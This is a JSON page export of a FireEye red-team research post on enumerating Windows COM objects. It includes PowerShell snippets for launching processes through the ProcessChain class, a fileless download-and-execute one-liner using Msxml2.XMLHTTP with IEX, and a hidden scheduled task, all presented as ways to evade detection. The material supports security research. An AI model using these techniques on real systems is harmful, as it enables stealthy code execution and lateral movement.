{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Tue Jun 04 2019 10:45:10 GMT-0400",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "Hunting COM Objects",
    "jcr:versionHistory": "138efb82-671a-4b76-9992-11cf966eac08",
    "author": "Charles Hamilton",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "b61e0dd3-5780-4143-87b2-89e8b520d94a"
    ],
    "jcr:created": "Tue Oct 22 2019 15:32:11 GMT+0000",
    "cq:lastModified": "Tue Oct 22 2019 15:31:54 GMT+0000",
    "jcr:baseVersion": "b61e0dd3-5780-4143-87b2-89e8b520d94a",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:charles-hamilton",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:penetration-testing",
      "fireeye-blog-tags:com-objects",
      "fireeye-blog-tags:red-team"
    ],
    "jcr:uuid": "a04ba818-0335-43c0-895d-2acfe70843e6",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Tue Jun 04 2019 10:45:00 GMT-0400",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003ECOM objects have recently been used by penetration testers, Red Teams, and malicious actors to perform lateral movement. COM objects were studied by several other researchers in the past, including Matt Nelson (enigma0x3), who published a \u003Ca href=\u0022https:\/\/enigma0x3.net\/2017\/01\/05\/lateral-movement-using-the-mmc20-application-com-object\/\u0022\u003Eblog post\u003C\/a\u003E about it in 2017. Some of these COM objects were also \u003Ca href=\u0022https:\/\/github.com\/EmpireProject\/Empire\/blob\/master\/data\/module_source\/lateral_movement\/Invoke-DCOM.ps1\u0022\u003Eadded to the Empire project\u003C\/a\u003E. To improve the Red Team practice, FireEye performed research into the available COM objects on Windows 7 and 10 operating systems. Several interesting COM objects were discovered that allow task scheduling, fileless download \u0026amp; execute as well as command execution. Although not security vulnerabilities on their own, usage of these objects can be used to defeat detection based on process behavior and heuristic signatures.\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ch4\u003EWhat is a COM Object?\u003C\/h4\u003E\n\u003Cp\u003EAccording to \u003Ca href=\u0022https:\/\/docs.microsoft.com\/en-us\/windows\/desktop\/com\/the-component-object-model\u0022\u003EMicrosoft\u003C\/a\u003E, \u201cThe Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft\u0027s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.\u201d\u003C\/p\u003E\n\u003Cp\u003ECOM was created in the 1990\u2019s as language-independent binary interoperability standard which enables separate code modules to interact with each other. This can occur within a single process or cross-process, and Distributed COM (DCOM) adds serialization allowing Remote Procedure Calls across the network.\u003C\/p\u003E\n\u003Cp\u003EThe term \u201cCOM Object\u201d refers to an executable code section which implements one or more interfaces deriving from IUnknown.\u0026nbsp; IUnknown is an interface with 3 methods, which support object lifetime reference counting and discovery of additional interfaces.\u0026nbsp; Every COM object is identified by a unique binary identifier. These 128 bit (16 byte) globally unique identifiers are generically referred to as GUIDs.\u0026nbsp; When a GUID is used to identify a COM object, it is a CLSID (class identifier), and when it is used to identify an Interface it is an IID (interface identifier). Some CLSIDs also have human-readable text equivalents called a ProgID.\u003C\/p\u003E\n\u003Cp\u003ESince COM is a binary interoperability standard, COM objects are designed to be implemented and consumed from different languages.\u0026nbsp; Although they are typically instantiated in the address space of the calling process, there is support for running them out-of-process with inter-process communication proxying the invocation, and even remotely from machine to machine.\u003C\/p\u003E\n\u003Cp\u003EThe Windows Registry contains a set of keys which enable the system to map a CLSID to the underlying code implementation (in a DLL or EXE) and thus create the object.\u003C\/p\u003E\n\u003Ch4\u003EMethodology\u003Cb\u003E\u003Csub\u003E\u003C\/sub\u003E\u003C\/b\u003E\u003C\/h4\u003E\n\u003Cp\u003EThe registry key \u003Cspan class=\u0022code\u0022\u003EHKEY_CLASSES_ROOT\\CLSID\u003C\/span\u003E exposes all the information needed to enumerate COM objects, including the CLSID and ProgID. The CLSID is a globally unique identifier associated with a COM class object. The ProgID is a programmer-friendly string representing an underlying CLSID.\u003C\/p\u003E\n\u003Cp\u003EThe list of CLSIDs can be obtained using the following Powershell commands in Figure 1.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003ENew-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\u003Cbr\u003E\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 \u0026gt; clsids.txt\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Enumerating CLSIDs under HKCR\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe output will resemble Figure 2.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E{0000002F-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000300-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000301-A8F2-4877-BA0A-FD2B6645FB94}\u003Cbr\u003E\n {00000303-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000304-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000305-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000306-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000308-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000309-0000-0000-C000-000000000046}\u003Cbr\u003E\n {0000030B-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000315-0000-0000-C000-000000000046}\u003Cbr\u003E\n {00000316-0000-0000-C000-000000000046}\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2:Abbreviated list of CLSIDs from HKCR\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EWe can use the list of CLSIDs to instantiate each object in turn, and then enumerate the methods and properties exposed by each COM object. PowerShell exposes the \u003Cspan class=\u0022code\u0022\u003EGet-Member\u003C\/span\u003E cmdlet that can be used to list methods and properties on an object easily. Figure 3 shows a PowerShell script to enumerate this information. Where possible in this study, standard user privileges were used to provide insight into available COM objects under the worst-case scenario of having no administrative privileges.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E\u003Ci\u003E$Position\u0026nbsp; = 1\u003Cbr\u003E\n $Filename = \u0026quot;win10-clsid-members.txt\u0026quot;\u003Cbr\u003E\n $inputFilename = \u0026quot;clsids.txt\u0026quot;\u003Cbr\u003E\n ForEach($CLSID in Get-Content $inputFilename) {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; Write-Output \u0026quot;$($Position) - $($CLSID)\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; Write-Output \u0026quot;------------------------\u0026quot; | Out-File $Filename -Append\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; Write-Output $($CLSID) | Out-File $Filename -Append\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; $handle | Get-Member | Out-File $Filename -Append\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; $Position += 1\u003Cbr\u003E\n }\u003C\/i\u003E\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: PowerShell scriptlet used to enumerate available methods and properties\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIf you run this script, expect some interesting side-effect behavior such as arbitrary applications being launched, system freezes, or script hangs. Most of these issues can be resolved by closing the applications that were launched or by killing the processes that were spawned.\u003C\/p\u003E\n\u003Cp\u003EArmed with a list of all the CLSIDs and the methods and properties they expose, we can begin the hunt for interesting COM objects. Most COM servers (code implementing a COM object) are implemented in a DLL whose path is stored in the registry key e.g. under \u003Cspan class=\u0022code\u0022\u003EInprocServer32\u003C\/span\u003E. This is useful because reverse engineering may be required to understand undocumented COM objects.\u003C\/p\u003E\n\u003Cp\u003EOn Windows 7, a total of 8,282 COM objects were enumerated. Windows 10 featured 3,250 new COM objects in addition to those present on Windows 7. Non-Microsoft COM objects were generally omitted because they cannot be reliably expected to be present on target machines, which limits their usefulness to Red Team operations. Selected Microsoft COM objects from the Windows SDK were included in the study for purposes of targeting developer machines.\u003C\/p\u003E\n\u003Cp\u003EOnce the members were obtained, a keyword-based search approach was used to quickly yield results. For the purposes of this research, the following keywords were used: execute, exec, spawn, launch, and run.\u003C\/p\u003E\n\u003Cp\u003EOne example was the \u003Cspan class=\u0022code\u0022\u003E{F1CA3CE9-57E0-4862-B35F-C55328F05F1C}\u003C\/span\u003E COM object (\u003Cspan class=\u0022code\u0022\u003EWatWeb.WatWebObject\u003C\/span\u003E) on Windows 7. This COM object exposed a method named \u003Cspan class=\u0022code\u0022\u003ELaunchSystemApplication\u003C\/span\u003E as shown in Figure 4.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/COMobjects\/Picture4.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: WatWeb.WatWebObject methods including the interesting LaunchSystemApplication method\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe \u003Cspan class=\u0022code\u0022\u003EInprocServer32\u003C\/span\u003E entry for this object was set to \u003Cspan class=\u0022code\u0022\u003EC:\\windows\\system32\\wat\\watweb.dll\u003C\/span\u003E, which is part of Microsoft\u2019s Windows Genuine Advantage product key validation system. The \u003Cspan class=\u0022code\u0022\u003ELaunchSystemApplication\u003C\/span\u003E method expected three parameters, but this COM object was not well-documented and reverse engineering was required, meaning it was time to dig through some assembly code.\u003C\/p\u003E\n\u003Cp\u003EOnce \u003Cspan class=\u0022code\u0022\u003EC:\\windows\\system32\\wat\\watweb.dll\u003C\/span\u003E is loaded in your favorite tool (in this case, IDA Pro), it\u2019s time to find where this method is defined. Luckily, in this case, Microsoft exposed debugging symbols, making the reverse engineering much more efficient. Looking at the disassembly, \u003Cspan class=\u0022code\u0022\u003ELaunchSystemApplication\u003C\/span\u003E calls \u003Cspan class=\u0022code\u0022\u003ELaunchSystemApplicationInternal\u003C\/span\u003E, which, as one might suspect, calls \u003Cspan class=\u0022code\u0022\u003ECreateProcess\u003C\/span\u003E to launch an application. This is shown in the Hex-Rays decompiler pseudocode in Figure 5.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/COMobjects\/Picture5.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Hex-Rays pseudocode confirming that LaunchSystemApplicationInternal calls CreateProcessW\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EBut does this COM object allow creation of arbitrary processes? The argument passed to \u003Cspan class=\u0022code\u0022\u003ECreateProcess\u003C\/span\u003E is user-controlled and is derived from the arguments passed to the function. However, notice the call to \u003Cspan class=\u0022code\u0022\u003ECWgpOobWebObjectBaseT::IsApprovedApplication\u003C\/span\u003E prior to the \u003Cspan class=\u0022code\u0022\u003ECreateProcess\u003C\/span\u003E call. The Hex-Rays pseudocode for this method is shown in Figure 6.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/COMobjects\/Picture6.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Hex-Rays pseudocode for the IsApprovedApplication method\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe user-controlled string is validated against a specific pattern. In this case, the string must match \u003Cspan class=\u0022code\u0022\u003Eslui.exe\u003C\/span\u003E. Furthermore, the user-controlled string is then appended to the system path, meaning it would be necessary to, for instance, replace the real \u003Cspan class=\u0022code\u0022\u003Eslui.exe\u003C\/span\u003E to circumvent the check. Unfortunately, the validation performed by Microsoft limits the usefulness of this method as a general-purpose process launcher.\u003C\/p\u003E\n\u003Cp\u003EIn other cases, code execution was straightforward. For example, the \u003Cspan class=\u0022code\u0022\u003EProcessChain\u003C\/span\u003E Class with CLSID \u003Cspan class=\u0022code\u0022\u003E{E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E}\u003C\/span\u003E that is implemented in \u003Cspan class=\u0022code\u0022\u003EC:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\prchauto.dll\u003C\/span\u003E. This COM class can be readily analyzed without looking at any disassembly listings, because \u003Cspan class=\u0022code\u0022\u003Eprchauto.dll\u003C\/span\u003E contains a \u003Cspan class=\u0022code\u0022\u003ETYPELIB\u003C\/span\u003E resource containing a COM Type Library that can be viewed using \u003Ca href=\u0022https:\/\/docs.microsoft.com\/en-us\/windows\/desktop\/com\/ole-com-object-viewer\u0022\u003EOleview.exe\u003C\/a\u003E. Figure 7 shows the type library for \u003Cspan class=\u0022code\u0022\u003EProcessChainLib\u003C\/span\u003E, exposing a \u003Cspan class=\u0022code\u0022\u003ECommandLine\u003C\/span\u003E property and a \u003Cspan class=\u0022code\u0022\u003EStart\u003C\/span\u003E method. \u003Cspan class=\u0022code\u0022\u003EStart\u003C\/span\u003E accepts a reference to a Boolean value.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/COMobjects\/Picture7.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: Type library for ProcessChainLib as displayed in Interface Definition Language by Oleview.exe\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EBased on this, commands can be started as shown in Figure 8.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(\u0026quot;E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E\u0026quot;))\u003Cbr\u003E\n $handle.CommandLine = \u0026quot;cmd \/c whoami\u0026quot;\u003Cbr\u003E\n $handle.Start([ref]$True)\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Using the ProcessChainLib COM server to start a process\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EEnumerating and examining COM objects in this fashion turned up other interesting finds as well.\u003C\/p\u003E\n\u003Ch4\u003EFileless Download and Execute\u003C\/h4\u003E\n\u003Cp\u003EFor instance, the COM object \u003Cspan class=\u0022code\u0022\u003E{F5078F35-C551-11D3-89B9-0000F81FE221}\u003C\/span\u003E (\u003Cspan class=\u0022code\u0022\u003EMsxml2.XMLHTTP.3.0\u003C\/span\u003E) exposes an XML HTTP 3.0 feature that can be used to download arbitrary code for execution without writing the payload to the disk and without triggering rules that look for the commonly-used \u003Cspan class=\u0022code\u0022\u003ESystem.Net.WebClient\u003C\/span\u003E. The XML HTTP 3.0 object is usually used to perform AJAX requests. In this case, data fetched can be directly executed using the \u003Cspan class=\u0022code\u0022\u003EInvoke-Expression\u003C\/span\u003E cmdlet (IEX).\u003C\/p\u003E\n\u003Cp\u003EThe example in Figure 9 executes our code locally:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(\u0026quot;F5078F35-C551-11D3-89B9-0000F81FE221\u0026quot;)); $o.Open(\u0026quot;GET\u0026quot;, \u0026quot;http:\/\/127.0.0.1\/payload\u0026quot;, $False); $o.Send(); IEX $o.responseText;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Fileless download without System.Net.WebClient\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003ETask Scheduling\u003C\/h4\u003E\n\u003Cp\u003EAnother example is \u003Cspan class=\u0022code\u0022\u003E{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}\u003C\/span\u003E which implements the \u003Cspan class=\u0022code\u0022\u003ESchedule.Service\u003C\/span\u003E class for operating the Windows Task Scheduler Service. This COM object allows privileged users to schedule a task on a host (including a remote host) without using the \u003Cspan class=\u0022code\u0022\u003Eschtasks.exe\u003C\/span\u003E binary or the at command.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E$TaskName = [Guid]::NewGuid().ToString()\u003Cbr\u003E\n $Instance = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026quot;Schedule.Service\u0026quot;))\u003Cbr\u003E\n $Instance.Connect()\u003Cbr\u003E\n $Folder = $Instance.GetFolder(\u0026quot;\\\u0026quot;)\u003Cbr\u003E\n $Task = $Instance.NewTask(0)\u003Cbr\u003E\n $Trigger = $Task.triggers.Create(0)\u003Cbr\u003E\n $Trigger.StartBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay))\u003Cbr\u003E\n $Trigger.EndBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))\u003Cbr\u003E\n $Trigger.ExecutionTimelimit = \u0026quot;PT5M\u0026quot;\u003Cbr\u003E\n $Trigger.Enabled = $True\u003Cbr\u003E\n $Trigger.Id = $Taskname\u003Cbr\u003E\n $Action = $Task.Actions.Create(0)\u003Cbr\u003E\n $Action.Path = \u201ccmd.exe\u201d\u003Cbr\u003E\n $Action.Arguments = \u201c\/c whoami\u201d\u003Cbr\u003E\n $Action.HideAppWindow = $True\u003Cbr\u003E\n $Folder.RegisterTaskDefinition($TaskName, $Task, 6, \u0026quot;\u0026quot;, \u0026quot;\u0026quot;, 3)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Efunction Convert-Date {\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; param(\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;[datetime]$Date\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; )\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; PROCESS {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$Date.Touniversaltime().tostring(\u0026quot;u\u0026quot;) -replace \u0026quot; \u0026quot;,\u0026quot;T\u0026quot;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; }\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 10: Scheduling a task\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003ECOM objects are very powerful, versatile, and integrated with Windows, which means that they are nearly always available. COM objects can be used to subvert different detection patterns including command line arguments, PowerShell logging, and heuristic detections. Stay tuned for part 2 of this blog series as we will continue to look at hunting COM objects.\u003C\/p\u003E\n",
        "jcr:lastModified": "Tue Jun 04 2019 10:54:42 GMT-0400",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003ECOM objects have recently been used by penetration testers, Red Teams, and malicious actors to perform lateral movement.\u003C\/p\u003E\n",
      "jcr:lastModified": "Mon Jun 03 2019 12:28:01 GMT-0400",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Tue Oct 22 2019 15:31:54 GMT+0000",
      "imageRotate": "0"
    }
  }
}
